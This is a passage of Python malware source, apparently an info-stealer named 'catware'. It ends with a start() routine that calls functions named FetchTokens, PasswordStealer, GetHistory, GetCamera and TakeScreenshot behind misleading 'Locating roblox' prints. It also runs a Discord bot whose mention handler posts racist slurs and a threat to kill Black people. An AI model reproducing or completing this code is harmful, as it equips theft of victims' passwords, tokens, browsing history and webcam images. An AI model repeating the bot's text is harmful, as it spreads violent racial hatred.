        startembed.add_field(name = '\nok', value =  "powered by nigger joss <:munapea:927651098532139008>"  ,inline= False)
        await channel.send(embed = startembed)

    @catware.event
    async def on_message(message):
        if catware.user.mentioned_in(message):
            startembed = discord.Embed(title = f"fak yu niger", description= "I FUCKING HATE NIGGERSSS\n NIGGERS ARE REALLY BIG NIGGERS I KILL EVERY NIGGER I SEE\n FUCK NIGGERS IN THE ASSHOOOLEE LOOOOOL" , color=000000)
            startembed.set_thumbnail(url="https://chpic.su/_data/stickers/y/Yellowboi/Yellowboi_044.webp")
            startembed.add_field(name = '\nok', value =  "powered by nigger joss <:munapea:927651098532139008>"  ,inline= False)
            await message.channel.send(embed = startembed) 
        await catware.process_commands(message)
    catware.run("UR BOT TOKEN")

def start():
    print('Locating roblox')
    FetchTokens()#embed
    FetchComputer()#embed
    ScrapeWindows()#txt
    GetHistory()#txt
    PasswordStealer()#txt
    networklol()#txt
    print('Accessing webserver')
    GetCamera()
    TakeScreenshot()
    print('Starting injector')
    Startbot()
start()
